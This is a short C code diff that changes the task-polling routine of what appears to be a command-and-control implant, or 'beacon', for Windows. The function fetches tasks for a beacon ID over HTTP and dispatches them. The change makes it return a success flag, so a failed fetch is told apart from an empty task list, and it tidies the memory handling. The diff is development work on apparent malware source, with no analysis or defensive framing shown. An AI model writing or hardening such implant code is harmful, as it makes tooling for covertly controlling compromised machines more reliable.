@@ -194,15 +194,16 @@ void beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result) {
 }
 
 /* ── task poll and dispatch ─────────────────────────────── */
-void beacon_poll_tasks(BEACON_CTX *ctx) {
+BOOL beacon_poll_tasks(BEACON_CTX *ctx) {
     wchar_t path[64];
     _snwprintf(path, 64, L"/tasks/%lu", (unsigned long)ctx->beacon_id);
 
     DWORD body_len = 0;
     char *body = http_get_body(ctx, path, &body_len);
-    if (!body || body_len < 2) {
-        if (body) HeapFree(GetProcessHeap(), 0, body);
-        return;
+    if (!body) return FALSE;
+    if (body_len < 2) {
+        HeapFree(GetProcessHeap(), 0, body);
+        return TRUE;
     }
 
     const char *p   = body;
@@ -303,4 +304,5 @@ next:
     }
 
     HeapFree(GetProcessHeap(), 0, body);
+    return TRUE;
 }
